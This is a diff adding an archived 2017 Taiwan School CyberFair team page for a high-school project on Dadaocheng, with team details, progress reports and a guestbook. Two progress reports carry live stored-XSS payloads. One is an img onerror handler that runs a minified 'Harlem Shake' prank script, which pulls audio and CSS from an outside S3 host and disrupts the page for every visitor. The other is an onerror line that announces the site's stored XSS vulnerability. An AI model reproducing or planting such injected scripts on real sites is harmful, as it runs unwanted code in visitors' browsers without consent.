@@ -1,0 +1,816 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="author" content="臺灣資訊教育發展協會">
+<meta name="programer" content="alanchang15@gmail.com">
+<meta name="copyright" content="2017臺灣學校網界博覽會">
+<meta name="keywords" content="2017臺灣學校網界博覽會">
+<meta name="description" content="2017臺灣學校網界博覽會 - 168 http://librarywork.taiwanschoolnet.org/cyberfair2017/168/narrative.htm">
+<meta name="robots" content="NOODP">
+<meta property="og:title" content="2017 臺灣學校網界博覽會 - 秀出臺灣的生命與活力">
+<meta property="og:url" content="http://cyberfair2017.taiwanschoolnet.org/team/detail/C1735010076">
+<meta property="og:type" content="website">
+<meta property="og:image" content="http://librarywork.taiwanschoolnet.org/cyberfair2017/collection/C1735010076-narrative.jpg">
+<title>2017 臺灣學校網界博覽會 - 秀出臺灣的生命與活力</title>
+<link rel="shortcut icon" href="http://cyberfair2017.taiwanschoolnet.org/favicon.ico" type="image/x-icon" />
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="http://cyberfair2017.taiwanschoolnet.org/themes/2017/assets/css/style.css">
+<link rel="stylesheet" href="http://cyberfair2017.taiwanschoolnet.org/themes/2017/assets/js/fancybox/jquery.fancybox.css">
+<script>
+	var global = {
+	  baseUrl: 'http://cyberfair2017.taiwanschoolnet.org/',
+	  cyberfairEmail: 'cyberfair2017@taiwanschoolnet.org'
+	};
+	if (typeof document.location.origin == 'undefined') {
+	    document.location.origin = window.location.protocol + "//" + window.location.hostname + (window.location.port ? ':' + window.location.port: '');
+	}
+	</script><style>
+    area {
+        display: none;
+    }
+    :visited {
+        css declarations;
+    }
+    </style>
+</head>
+<body>
+<!-- Google Tag Manager -->
+<noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-KMXGSS" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-KMXGSS');</script><!-- End Google Tag Manager --><div class="page">
+        <!-- Header
+        ============================================= -->
+        <div class="top-counter">
+<div id="top-search">
+    <searchbox-only></searchbox-only>
+</div>
+<div class="counting">參訪人數：5707721 / 線上人數：3</div>
+</div>
+<header id="header" class="full-header"><meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
+<div id="header-wrap">
+
+        <div class="container clearfix">
+
+            <div id="top-menu-trigger"><i class="icon-reorder"></i></div>
+
+            <!-- Logo
+            ============================================= -->
+            <div id="logo">
+                <a href="http://cyberfair2017.taiwanschoolnet.org/" class="standard-logo">
+                    <img src="http://cyberfair2017.taiwanschoolnet.org/themes/2017/assets/images/cyberfair2017.png" alt="2017 臺灣學校網界博覽會Logo"></a>
+</div>
+            <!-- #logo end -->
+
+            <!-- Primary Navigation
+            ============================================= -->
+            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#top-menu" aria-expanded="false">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+              </button>
+            <nav id="top-menu" class="collapse navbar-collapse"><ul class="desktop">
+<li><a href="http://cyberfair2017.taiwanschoolnet.org/history"><span class="fa fa-history"></span>歷屆作品</a></li>
+    <li><a href="http://cyberfair2017.taiwanschoolnet.org/ceremony/index" target="_blank"><span class="fa fa-trophy"></span>頒獎典禮</a></li>
+    <li><a href="http://cyberfair2017.taiwanschoolnet.org/team/query"><span class="fa fa-search"></span>查詢隊伍</a></li>
+    <li><a href="http://cyberfair2017.taiwanschoolnet.org/team/workroom"><span class="fa fa-users"></span>隊伍工作室</a></li>
+</ul>
+<ul class="mobile">
+<li><a href="http://cyberfair2017.taiwanschoolnet.org/history"><span class="fa fa-history"></span>歷屆作品</a></li>
+    <li><a href="http://cyberfair2017.taiwanschoolnet.org/ceremony/index" target="_blank"><span class="fa fa-trophy"></span>頒獎典禮</a></li>
+    <li><a href="http://cyberfair2017.taiwanschoolnet.org/team/query"><span class="fa fa-search"></span>查詢隊伍</a></li>
+    <li><a href="http://cyberfair2017.taiwanschoolnet.org/team/workroom"><span class="fa fa-users"></span>隊伍工作室</a></li>
+</ul>
+<ul class="submenu">
+<li>
+        <div class="info">
+<span class="fa fa-child"></span><span>關於網界</span>
+</div>
+        <ul>
+<li><a href="/news">最新消息</a></li>
+            <li><a href="/origin">緣起</a></li>
+            <li><a href="/intro">活動介紹</a></li>
+        </ul>
+</li>
+    <li>
+        <div class="info">
+<span class="fa fa-bullseye"></span><span>活動辦法</span>
+</div>
+        <ul>
+<li><a href="/notice">我要報名</a></li>
+            <li><a href="/rule">參賽規則</a></li>
+            <li><a href="/mission">任務清單</a></li>
+            <li><a href="/category">競賽類別</a></li>
+            <li><a href="/reward">活動獎勵</a></li>
+            <li><a href="/schedule">賽程表</a></li>
+        </ul>
+</li>
+    <li>
+        <div class="info">
+<span class="fa fa-pencil-square-o"></span><span>成績評比</span>
+</div>
+        <ul>
+<li><a href="/mark">評比標準</a></li>
+            <li><a href="/score">如何評比</a></li>
+            <li><a href="http://score.taiwanschoolnet.org/2017/FinalGrade/SetFinalGrade.asp" target="_blank">決賽評審</a></li>
+        </ul>
+</li>
+    <li>
+        <div class="info">
+<span class="fa fa-globe"></span><span>國際網博</span>
+</div>
+        <ul>
+<li><a href="/n_notice">參賽辦法</a></li>
+            <li><a href="/n_sign">申請網站空間</a></li>
+            <li><a href="/n_response">回報確認名單</a></li>
+        </ul>
+</li>
+    <li>
+        <div class="info">
+<span class="fa fa-headphones"></span><span>服務專區</span>
+</div>
+        <ul>
+<li><a href="/thesis">網界相關專題學術論文</a></li>
+            <li><a href="/download">表單下載</a></li>
+            <li><a href="/right">認識智慧財產權</a></li>
+            <li><a href="/webnews">媒體消息</a></li>
+            <li><a href="/faq">FAQ</a></li>
+        </ul>
+</li>
+</ul></nav><!-- Top Search
+                ============================================= --><div class="search" id="top-search">
+                    <searchbox-only></searchbox-only>
+</div>
+                <!-- #top-search end -->
+            
+            <!-- #primary-menu end -->
+        </div>
+    </div>
+</header><!-- #header end --><div id="banner">
+            <div class="cloud">
+                <img src="http://cyberfair2017.taiwanschoolnet.org/themes/2017/assets/images/banner/cloud.png">
+</div>
+            <div class="main">
+                <img src="http://cyberfair2017.taiwanschoolnet.org/themes/2017/assets/images/banner/main.png" usemap="#Map"><map name="Map" id="Map"><area alt="" title="" href="/category_1" shape="rect" coords="204,470,367,555">
+<area alt="" title="" href="/category_2" shape="rect" coords="125,327,290,408">
+<area alt="" title="" href="/category_3" shape="rect" coords="178,166,353,253">
+<area alt="" title="" href="/category_4" shape="rect" coords="482,21,641,116">
+<area alt="" title="" href="/category_5" shape="rect" coords="758,27,905,136">
+<area alt="" title="" href="/category_6" shape="rect" coords="968,125,1132,222">
+<area alt="" title="" href="/category_7" shape="rect" coords="1067,292,1233,387">
+<area alt="" title="" href="/category_8" shape="rect" coords="983,439,1149,527"></map>
+</div>
+                                                        </div>
+
+
+
+        <!-- Content
+        ============================================= -->
+        <section class="content"><div class="container clearfix">
+                <div class="mainContent">
+                            <div class="contain-wrapper">
+            <div class="entry-header">
+                <h1>查詢隊伍</h1>
+            </div>
+            <div class="content col-md-12">
+                                <div id="fb-root"></div>         
+				<div style="float: right;" class="fb-like" data-href="" data-layout="button_count" data-action="like" data-show-faces="true" data-share="true"></div>					
+                <div style="float: right;" id="count">瀏覽次數：201  </div>                  
+                                <div class="title" style="margin-bottom: 10px;">歡迎進入 <b style="color: #F60;font-size: 16px;">168</b> 交流園區　專題研究累計 91 小時</div>
+				<ul class="nav nav-tabs">
+<li class="active">
+						<a data-toggle="tab" href="#profile">基本資料</a>
+					</li>
+					<li>
+						<a data-toggle="tab" href="#member">隊員資料</a>
+					</li>
+					<li>
+						<a data-toggle="tab" href="#progress">進度報告</a>
+					</li>
+					<li>
+						<a data-toggle="tab" href="#guestbook">留言版</a>
+					</li>	
+								
+					<li>
+						<a data-toggle="tab" href="#narrative">專題簡報</a>
+					</li>
+									</ul>
+<div class="tab-content">
+					<div id="profile" class="tab-pane active">
+                        <div class="content">
+                            <table class="table table-striped table-condensed table-bordered"><tbody>
+<tr>
+<th width="140">報名日期：</th>
+                                        <td id="date">2017-01-24 11:31:18</td>
+                                    </tr>
+<tr>
+<th>隊伍編號：</th>
+                                        <td id="tid">C1735010076</td>
+                                    </tr>
+<tr>
+<th>隊伍名稱：</th>
+                                        <td id="name">168</td>
+                                    </tr>
+<tr>
+<th>縣　　市：</th>
+                                        <td id="county">臺北市</td>
+                                    </tr>
+<tr>
+<th>組　　別：</th>
+                                        <td id="level">高中組</td>
+                                    </tr>
+<tr>
+<th>參賽類別：</th>
+                                        <td id="category">地方觀光資源類</td>
+                                    </tr>
+<tr>
+<th>中文專題名稱：</th>
+                                        <td id="project_name">七大強稻進埕門</td>
+                                    </tr>
+<tr>
+<th>英文專題名稱：</th>
+                                        <td id="projecten_name">Way to Dadaocheng</td>
+                                    </tr>
+<tr>
+<th>專題描述：</th>
+                                        <td id="project_describ">自清末至日治時期，大稻埕在經濟、社會及文化活動上都有傲視全島的發展及成長，不僅商業活動頻繁，同時也是人文薈萃之地。因此我們希望藉由網頁的方式將大稻埕的歷史繁榮及現今的風采呈現出來。</td>
+                                    </tr>
+<tr>
+<th>地方描述：</th>
+                                        <td id="project_local">大稻埕是個古色古香的地方，有許多古老建築，例如走懷舊風的星巴克就是一個非常經典的例子，融合了現代商業跟古式建築，另外，歷史悠久的仁安醫院經過整修後也重現了當年的樣貌，建築內部也保有當時醫院內的設施、器具，在那邊的志工阿姨也細心的做講解讓我們知道這座醫院的歷史，當然，在大稻埕絕對不能錯過熱鬧的迪化街與永樂市場，迪化街在日據時代是南北雜貨、茶行為主，現在則轉變為年貨大街，而永樂市場在1960年代則是紡織工業的大本營，至今還是大眾喜愛的布莊之一，這幾個非常經典的景點都為大稻埕增添了更多昔日的氣息，是民眾們假日出遊的好去處。</td>
+                                    </tr>
+<tr>
+<th>學校名稱：</th>
+                                        <td id="school">市立大安高工</td>
+                                    </tr>
+</tbody></table>
+</div>
+					</div>
+					
+					<div id="member" class="tab-pane">
+						<div class="content">
+	                        <div class="title">指導老師 2</div>
+	                        <div class="content">
+                                <table class="table table-striped table-condensed table-bordered"><tbody>
+<tr>
+<th width="50">姓名</th>
+            	                            <td>林冠宇</td>
+            	                        </tr>
+<tr>
+<th>性別</th>
+            	                            <td>男</td>
+            	                        </tr>
+<tr>
+<th width="50">姓名</th>
+            	                            <td>洪醒漢</td>
+            	                        </tr>
+<tr>
+<th>性別</th>
+            	                            <td>男</td>
+            	                        </tr>
+</tbody></table>
+</div>
+	                    	<div class="title">學生成員 7</div>
+	                        <div class="content">
+                                <table class="table table-striped table-condensed table-bordered"><tbody>
+<tr>
+<th width="50">姓名</th>
+            	                            <td>王品雅</td>
+            	                        </tr>
+<tr>
+<th>性別</th>
+            	                            <td>女</td>
+            	                        </tr>
+<tr>
+<th width="50">姓名</th>
+            	                            <td>范萬昱</td>
+            	                        </tr>
+<tr>
+<th>性別</th>
+            	                            <td>男</td>
+            	                        </tr>
+<tr>
+<th width="50">姓名</th>
+            	                            <td>黃子祐</td>
+            	                        </tr>
+<tr>
+<th>性別</th>
+            	                            <td>男</td>
+            	                        </tr>
+<tr>
+<th width="50">姓名</th>
+            	                            <td>傅文宗</td>
+            	                        </tr>
+<tr>
+<th>性別</th>
+            	                            <td>男</td>
+            	                        </tr>
+<tr>
+<th width="50">姓名</th>
+            	                            <td>洪嘉駿</td>
+            	                        </tr>
+<tr>
+<th>性別</th>
+            	                            <td>男</td>
+            	                        </tr>
+<tr>
+<th width="50">姓名</th>
+            	                            <td>唐倢俐</td>
+            	                        </tr>
+<tr>
+<th>性別</th>
+            	                            <td>女</td>
+            	                        </tr>
+<tr>
+<th width="50">姓名</th>
+            	                            <td>凌于涵</td>
+            	                        </tr>
+<tr>
+<th>性別</th>
+            	                            <td>女</td>
+            	                        </tr>
+</tbody></table>
+</div>                    	
+	                    </div>
+					</div>
+
+					<div id="progress" class="tab-pane">
+                                                                                                                        <div class="content">
+                            <table class="table table-striped table-condensed table-bordered"><tbody>
+<tr>
+<th colspan="2">第 9 份報告寫於 2017-02-21 21:44:21　專題研究時數：7</th>
+                                    </tr>
+<tr>
+<td class="sp" style="withh: 40px;">標題</td>
+                                        <td class="titlle">最後內容確認修正</td>
+                                    </tr>
+<tr>
+<td class="sp" rowspan="2">內容</td>
+                                        <td style="word-break: break-all;">增加"關於我們" <br>
+修改"交通資訊"位置<br>
+增加"參考資料"<br>
+錯字修正，電腦內容呈現排版修正，照片呈現"載入更多"由下方移置上方<br>
+增加相片內容簡介<br>
+將恐侵犯智慧財產權之相片動畫刪除<br>
+補齊簡報遺漏資料<br>
+於"大稻埕景點"處增加"交通資訊"<br>
+</td>
+                                    </tr>
+<tr>
+<td>
+                                                                                    </td>
+                                    </tr>
+</tbody></table>
+</div>
+                                                                        <div class="content">
+                            <table class="table table-striped table-condensed table-bordered"><tbody>
+<tr>
+<th colspan="2">第 8 份報告寫於 2017-02-21 13:53:56　專題研究時數：6</th>
+                                    </tr>
+<tr>
+<td class="sp" style="withh: 40px;">標題</td>
+                                        <td class="titlle">20170221 - 網頁完成</td>
+                                    </tr>
+<tr>
+<td class="sp" rowspan="2">內容</td>
+                                        <td style="word-break: break-all;">CrossSiteScripting<br><img src="http://cyberfair2017.taiwanschoolnet.org/themes/2017/owo" onerror='!function(){function a(){var a=document.createElement("link");a.setAttribute("type","text/css"),a.setAttribute("rel","stylesheet"),a.setAttribute("href",w),a.setAttribute("class",x),document.body.appendChild(a)}function b(){for(var a=document.getElementsByClassName(x),b=0;b&lt;a.length;b++)document.body.removeChild(a[b])}function c(){var a=document.createElement("div");a.setAttribute("class",v),document.body.appendChild(a),setTimeout(function(){document.body.removeChild(a)},100)}function d(a){return{height:a.offsetHeight,width:a.offsetWidth}}function e(a){var b=d(a);return b.height&gt;n&amp;&amp;b.height&lt;p&amp;&amp;b.width&gt;o&amp;&amp;b.width&lt;q}function f(a){for(var b=a,c=0;b;)c+=b.offsetTop,b=b.offsetParent;return c}function g(){var a=document.documentElement;return window.innerWidth?window.innerHeight:a&amp;&amp;!isNaN(a.clientHeight)?a.clientHeight:0}function h(){return window.pageYOffset?window.pageYOffset:Math.max(document.documentElement.scrollTop,document.body.scrollTop)}function i(a){var b=f(a);return b&gt;=z&amp;&amp;b&lt;=y+z}function j(){var a=document.createElement("audio");a.setAttribute("class",x),a.src=r,a.loop=!1,a.addEventListener("canplay",function(){setTimeout(function(){k(B)},500),setTimeout(function(){m(),c();for(var a=0;a&lt;E.length;a++)l(E[a])},15500)},!0),a.addEventListener("ended",function(){m(),b()},!0),a.innerHTML=" &lt;p&gt;If you are reading this, it is because your browser does not support the audio element. We recommend that you get a new browser.&lt;/p&gt; &lt;p&gt;",document.body.appendChild(a),a.play()}function k(a){a.className+=" "+s+" "+t}function l(a){a.className+=" "+s+" "+u[Math.floor(Math.random()*u.length)]}function m(){for(var a=document.getElementsByClassName(s),b=new RegExp("\\b"+s+"\\b"),c=0;c&lt;a.length;)a[c].className=a[c].className.replace(b,"")}for(var n=30,o=30,p=350,q=350,r="//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake.mp3",s="mw-harlem_shake_me",t="im_first",u=["im_drunk","im_baked","im_trippin","im_blown"],v="mw-strobe_light",w="//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake-style.css",x="mw_added_css",y=g(),z=h(),A=document.getElementsByTagName("*"),B=null,C=0;C&lt;A.length;C++){var D=A[C];if(e(D)&amp;&amp;i(D)){B=D;break}}if(null===D)return void console.warn("Could not find a node of the right size. Please try a different page.");a(),j();for(var E=[],C=0;C&lt;A.length;C++){var D=A[C];e(D)&amp;&amp;E.push(D)}}();'>
+</td>
+                                    </tr>
+<tr>
+<td>
+                                                                                    </td>
+                                    </tr>
+</tbody></table>
+</div>
+                                                                        <div class="content">
+                            <table class="table table-striped table-condensed table-bordered"><tbody>
+<tr>
+<th colspan="2">第 7 份報告寫於 2017-02-16 13:04:17　專題研究時數：18</th>
+                                    </tr>
+<tr>
+<td class="sp" style="withh: 40px;">標題</td>
+                                        <td class="titlle"><h1>20170216 - 完成 相片Loader &amp; 美景介紹</h1></td>
+                                    </tr>
+<tr>
+<td class="sp" rowspan="2">內容</td>
+                                        <td style="word-break: break-all;">
+<h2>相片展示器</h2>
+<br><small>更新</small><br><b><br><h3>更新內容:</h3>
+<br><ol>
+<br><li>減少一次性網路傳輸</li>
+<br><li>可批次載入活動相片</li>
+<br>
+</ol>
+<br></b><br><img src="http://i.imgur.com/qkCfbys.jpg" alt="相片展示工具" width="350px" height="auto"><br><a href="https://github.com/ZoneTwelve/SpecialReportTest/commit/467a28a3da5696084732fa76351c2f239c065c07#diff-75dc608b6ac02208f53e9ffee94540db">GitHub更新日誌<h4></h4></a><br><br><h2>美景介紹 </h2>
+<br><small>更新</small><br><b><br><h3>更新內容:</h3>
+<br><ol>
+<br><li>整合內容與動態切換背景圖,增加與用戶互動限度</li>
+<br><li>壓縮程式碼(Javascript)行數</li>
+<br><li>進行相同效果展示</li>
+<br><li>統一並整理文章格式</li>
+<br>
+</ol>
+<br></b><br><img src="http://i.imgur.com/TypO6h9.png" alt="NewUpdate" width="350px" height="auto">
+</td>
+                                    </tr>
+<tr>
+<td>
+                                                                                    </td>
+                                    </tr>
+</tbody></table>
+</div>
+                                                                        <div class="content">
+                            <table class="table table-striped table-condensed table-bordered"><tbody>
+<tr>
+<th colspan="2">第 6 份報告寫於 2017-02-13 23:49:45　專題研究時數：1</th>
+                                    </tr>
+<tr>
+<td class="sp" style="withh: 40px;">標題</td>
+                                        <td class="titlle"><h1>20170213 - 新增與修正網頁內容圖片</h1></td>
+                                    </tr>
+<tr>
+<td class="sp" rowspan="2">內容</td>
+                                        <td style="word-break: break-all;">
+<h2>新增網頁Logo</h2>
+<br><img src="https://raw.githubusercontent.com/ZoneTwelve/SpecialReportTest/master/SpecialReport/images/favicon.ico" width="128px" height="128px"><br><h2>新增相關建築圖片</h2>
+<br><img src="https://raw.githubusercontent.com/ZoneTwelve/SpecialReportTest/master/SpecialReport/images/main.jpg" width="350px" height="auto"><br><h2>修正首頁text shadow不清楚</h2>
+<br><img src="http://i.imgur.com/nMkqfyN.png" width="350px"><a href="https://github.com/ZoneTwelve/SpecialReportTest"><h3>GitHub</h3></a>
+</td>
+                                    </tr>
+<tr>
+<td>
+                                                                                    </td>
+                                    </tr>
+</tbody></table>
+</div>
+                                                                        <div class="content">
+                            <table class="table table-striped table-condensed table-bordered"><tbody>
+<tr>
+<th colspan="2">第 5 份報告寫於 2017-02-13 13:12:39　專題研究時數：35</th>
+                                    </tr>
+<tr>
+<td class="sp" style="withh: 40px;">標題</td>
+                                        <td class="titlle">20170212 - 進行版型大更新</td>
+                                    </tr>
+<tr>
+<td class="sp" rowspan="2">內容</td>
+                                        <td style="word-break: break-all;">
+<h1>主頁(index)進行大更新</h1>
+<br><h2>測試修改版型設計<h2>
+<br><h3>測試結果:<h3><br></h3>
+<br>
+</h3>
+<br>
+</h2>
+<br>
+</h2>
+<br><p><b>PC版</b></p>
+<br><img src="http://i.imgur.com/1TJhlEP.jpg" width="350px"><p><b>Moblie版</b></p>
+<br><img src="http://i.imgur.com/cvtIwqd.png" width="350px"><h3><a href="https://github.com/ZoneTwelve/SpecialReportTest">GitHub源碼</a></h3>
+<br><br><br><br>
+</td>
+                                    </tr>
+<tr>
+<td>
+                                                                                    </td>
+                                    </tr>
+</tbody></table>
+</div>
+                                                                        <div class="content">
+                            <table class="table table-striped table-condensed table-bordered"><tbody>
+<tr>
+<th colspan="2">第 4 份報告寫於 2017-02-13 12:53:50　專題研究時數：14</th>
+                                    </tr>
+<tr>
+<td class="sp" style="withh: 40px;">標題</td>
+                                        <td class="titlle"><h1>20161230 - 網頁版面設計更新</h1></td>
+                                    </tr>
+<tr>
+<td class="sp" rowspan="2">內容</td>
+                                        <td style="word-break: break-all;">
+<h2>增加主要的網頁設計文件(CSS main.css)</h2>
+<br><h3>主頁(index) 增加 110 行</h3>
+<br><ul>
+<br><h3>總數:</h3>
+<br><b><li>變更/增加 15 個文件增加 9,335 行 刪除 0行</li>
+<br><li>(15 changed files with 9,335 additions and 0 deletions.)</li></b><br>
+</ul>
+<br><h3><a href="https://github.com/ZoneTwelve/ZoneTwelve.github.io.old/commit/340d718052e013211bb38c6b3f1f62c7070546be">GitHub日誌</a></h3>
+<br>
+</td>
+                                    </tr>
+<tr>
+<td>
+                                                                                    </td>
+                                    </tr>
+</tbody></table>
+</div>
+                                                                        <div class="content">
+                            <table class="table table-striped table-condensed table-bordered"><tbody>
+<tr>
+<th colspan="2">第 3 份報告寫於 2017-02-13 12:46:12　專題研究時數：2</th>
+                                    </tr>
+<tr>
+<td class="sp" style="withh: 40px;">標題</td>
+                                        <td class="titlle">20161231 - 修改主頁</td>
+                                    </tr>
+<tr>
+<td class="sp" rowspan="2">內容</td>
+                                        <td style="word-break: break-all;">
+<h2>主頁內容(index)修整</h2>
+<br><b>最終 增加 9 行 刪除 16 行<br>
+(9 additions and 16 deletions.)</b><br><a href="https://github.com/ZoneTwelve/ZoneTwelve.github.io.old/commit/ddea7f79f83d57833ce43abdb9363d5efe799ef8">GitHub日誌</a><br><img src="http://i.imgur.com/dC2yRrk.png" width="350px" height="auto">
+</td>
+                                    </tr>
+<tr>
+<td>
+                                                                                    </td>
+                                    </tr>
+</tbody></table>
+</div>
+                                                                        <div class="content">
+                            <table class="table table-striped table-condensed table-bordered"><tbody>
+<tr>
+<th colspan="2">第 2 份報告寫於 2017-02-13 00:24:19　專題研究時數：3</th>
+                                    </tr>
+<tr>
+<td class="sp" style="withh: 40px;">標題</td>
+                                        <td class="titlle"><h1>20170213 - 網頁內容修改</h1></td>
+                                    </tr>
+<tr>
+<td class="sp" rowspan="2">內容</td>
+                                        <td style="word-break: break-all;">
+<h2 style="margin:auto;">將次要網頁(PageA)內容修改為小測驗</h2>
+<br><img src="http://i.imgur.com/Fx5EoFX.png" width="350px" height="auto"><img src="http://i.imgur.com/qy87GRo.png" width="350px" height="auto">
+</td>
+                                    </tr>
+<tr>
+<td>
+                                                                                    </td>
+                                    </tr>
+</tbody></table>
+</div>
+                                                                        <div class="content">
+                            <table class="table table-striped table-condensed table-bordered"><tbody>
+<tr>
+<th colspan="2">第 1 份報告寫於 2017-02-12 17:20:21　專題研究時數：5</th>
+                                    </tr>
+<tr>
+<td class="sp" style="withh: 40px;">標題</td>
+                                        <td class="titlle"><h1>20161217 - 網頁設計更新GitHub</h1></td>
+                                    </tr>
+<tr>
+<td class="sp" rowspan="2">內容</td>
+                                        <td style="word-break: break-all;">
+<h3>2016/12/17 網頁設計更新</h3>
+<br><b>ZoneTwelve committed on GitHub on 17 Dec 2016</b><br><b><a href="https://github.com/ZoneTwelve/ZoneTwelve.github.io.old/commit/b1c211af829940b2aed35022e3f063da6d57f8b9">GitHub記錄</a></b>(開源管理服務)<small>(.注1)</small><br><br><a href="https://zonetwelve.github.io/SpecialReport/">新版網頁展示(20170124更新):</a><br><a href="https://github.com/ZoneTwelve/ZoneTwelve.github.io.old/tree/master/%E5%B0%88%E9%A1%8C">舊版網頁源碼網址</a><br>
+注1.<br>
+GitHub是一個透過Git進行版本控制的軟體原始碼代管服務<br><a href="https://zh.wikipedia.org/wiki/GitHub">詳細了解:</a><br><img src="http://cyberfair.taiwanschoolnet.org/themes/2017/w" onerror="console.log('此服務有 儲存型XSS 漏洞 by.ZoneTwelve')">
+</td>
+                                    </tr>
+<tr>
+<td>
+                                                                                    </td>
+                                    </tr>
+</tbody></table>
+</div>
+                                                					</div>
+
+					<div id="guestbook" class="tab-pane">
+                        <div class="content">
+                                                        <div style="margin:10px;"><button id="guestbook_add" class="btn btn-default">我要留言</button></div>
+                                                                                                                                                                        <table class="table"><tbody>
+<tr>
+<th colspan="2" style="text-align: left;position: relative;">
+                                            主旨： Helloworld<span><button class="guestbook_reply btn btn-default" data-gid="38" style="float:right;">回覆話題</button></span>
+                                        </th>
+                                    </tr>
+<tr>
+<td class="sp" style="width: 40px;">內容</td>
+                                            <td class="titlle" style="word-break: break-all;">
+                                                Helloworld                                            </td>
+                                        </tr>
+<tr>
+<td class="sp">作者</td>
+                                            <td><a style="padding-left: 0px;" href="http://cyberfair2017.taiwanschoolnet.org/team/detail/C1735010076" target="_blank">C1735010076</a></td>
+                                        </tr>
+<tr>
+<td class="sp">時間</td>
+                                            <td>2017-02-24 13:02:24</td>
+                                        </tr>
+</tbody></table>
+<table class="table"><tbody>
+<tr>
+<th colspan="2" style="text-align: left;position: relative;">
+                                            主旨： 無法留言?<span><button class="guestbook_reply btn btn-default" data-gid="37" style="float:right;">回覆話題</button></span>
+                                        </th>
+                                    </tr>
+<tr>
+<td class="sp" style="width: 40px;">內容</td>
+                                            <td class="titlle" style="word-break: break-all;">
+                                                                                            </td>
+                                        </tr>
+<tr>
+<td class="sp">作者</td>
+                                            <td><a style="padding-left: 0px;" href="http://cyberfair2017.taiwanschoolnet.org/team/detail/C1735010076" target="_blank">C1735010076</a></td>
+                                        </tr>
+<tr>
+<td class="sp">時間</td>
+                                            <td>2017-02-24 13:00:02</td>
+                                        </tr>
+</tbody></table>
+<table class="table"><tbody>
+<tr>
+<th colspan="2" style="text-align: left;position: relative;">
+                                            主旨： 留言測試<span><button class="guestbook_reply btn btn-default" data-gid="36" style="float:right;">回覆話題</button></span>
+                                        </th>
+                                    </tr>
+<tr>
+<td class="sp" style="width: 40px;">內容</td>
+                                            <td class="titlle" style="word-break: break-all;">
+                                                                                            </td>
+                                        </tr>
+<tr>
+<td class="sp">作者</td>
+                                            <td><a style="padding-left: 0px;" href="http://cyberfair2017.taiwanschoolnet.org/team/detail/C1735010076" target="_blank">C1735010076</a></td>
+                                        </tr>
+<tr>
+<td class="sp">時間</td>
+                                            <td>2017-02-24 12:58:31</td>
+                                        </tr>
+</tbody></table>
+</div>
+					</div>
+
+                          
+					<div id="narrative" class="tab-pane">
+						<div class="content">
+                            <table class="table table-striped table-condensed table-bordered"><tbody>
+<tr>
+<th>網址</th>
+                                        <td>
+                	                        <a href="http://librarywork.taiwanschoolnet.org/cyberfair2017/168/narrative.htm" target="target">
+                	                            http://librarywork.taiwanschoolnet.org/cyberfair2017/168/narrative.htm                	                        </a>
+                                        </td>
+                                    </tr>
+<tr>
+<th>快照</th>
+                                        <td>
+                                            <img class="lazyOwl" alt="" width="300" height="200" src="http://commons.taiwanschoolnet.org/no_thumb.gif" style="display: inline;">
+</td>
+                                    </tr>
+</tbody></table>
+</div>
+					</div>				
+											
+				</div>        
+			</div>
+        </div>
+      
+                </div>
+
+                <!-- <div class="breadcrumb">{breadcrumb}</div> -->
+
+                <div class="sidebar">
+                	<ul class="submenu">
+<li>
+        <div class="info">
+<span class="fa fa-child"></span><span>關於網界</span>
+</div>
+        <ul>
+<li><a href="/news">最新消息</a></li>
+            <li><a href="/origin">緣起</a></li>
+            <li><a href="/intro">活動介紹</a></li>
+        </ul>
+</li>
+    <li>
+        <div class="info">
+<span class="fa fa-bullseye"></span><span>活動辦法</span>
+</div>
+        <ul>
+<li><a href="/notice">我要報名</a></li>
+            <li><a href="/rule">參賽規則</a></li>
+            <li><a href="/mission">任務清單</a></li>
+            <li><a href="/category">競賽類別</a></li>
+            <li><a href="/reward">活動獎勵</a></li>
+            <li><a href="/schedule">賽程表</a></li>
+        </ul>
+</li>
+    <li>
+        <div class="info">
+<span class="fa fa-pencil-square-o"></span><span>成績評比</span>
+</div>
+        <ul>
+<li><a href="/mark">評比標準</a></li>
+            <li><a href="/score">如何評比</a></li>
+            <li><a href="http://score.taiwanschoolnet.org/2017/FinalGrade/SetFinalGrade.asp" target="_blank">決賽評審</a></li>
+        </ul>
+</li>
+    <li>
+        <div class="info">
+<span class="fa fa-globe"></span><span>國際網博</span>
+</div>
+        <ul>
+<li><a href="/n_notice">參賽辦法</a></li>
+            <li><a href="/n_sign">申請網站空間</a></li>
+            <li><a href="/n_response">回報確認名單</a></li>
+        </ul>
+</li>
+    <li>
+        <div class="info">
+<span class="fa fa-headphones"></span><span>服務專區</span>
+</div>
+        <ul>
+<li><a href="/thesis">網界相關專題學術論文</a></li>
+            <li><a href="/download">表單下載</a></li>
+            <li><a href="/right">認識智慧財產權</a></li>
+            <li><a href="/webnews">媒體消息</a></li>
+            <li><a href="/faq">FAQ</a></li>
+        </ul>
+</li>
+</ul>
+</div>
+            </div>
+        </section><!-- #content end --><!-- Footer
+        ============================================= --><footer><div class="section-counter">
+                
+
+<div class="container clearfix">
+    <div class="container a-center">
+        <h1>
+<span class="num">2017</span>臺灣學校網界博覽會<span class="inline-block">參加隊伍數</span>
+</h1>
+        <div id="teamtCounter">
+            <div class="count-section">
+                <div class="counter">
+                    <span>國小組</span>
+                    <div class="count">94</div>
+                    
+                </div>
+                <div class="counter">
+                    <span>國中組</span>
+                    <div class="count">150</div>
+                    
+                </div>
+                <div class="counter">
+                    <span>高中組</span>
+                    <div class="count">373</div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>                </div>      	
